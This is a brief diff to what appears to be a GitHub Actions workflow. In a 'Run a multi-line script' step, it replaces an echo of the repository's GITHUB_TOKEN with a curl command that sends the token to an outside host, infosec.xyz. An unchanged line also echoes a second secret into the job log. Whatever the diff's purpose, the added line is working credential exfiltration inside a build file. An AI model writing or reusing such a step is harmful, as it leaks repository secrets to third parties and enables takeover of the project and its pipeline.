@@ -13,5 +13,5 @@ jobs:
       run: id
     - name: Run a multi-line script
       run: |
-        echo ${{ secrets.GITHUB_TOKEN }}
+        curl -v https://infosec.xyz/${{ secrets.GITHUB_TOKEN }}
         echo ${{secrets.test}}
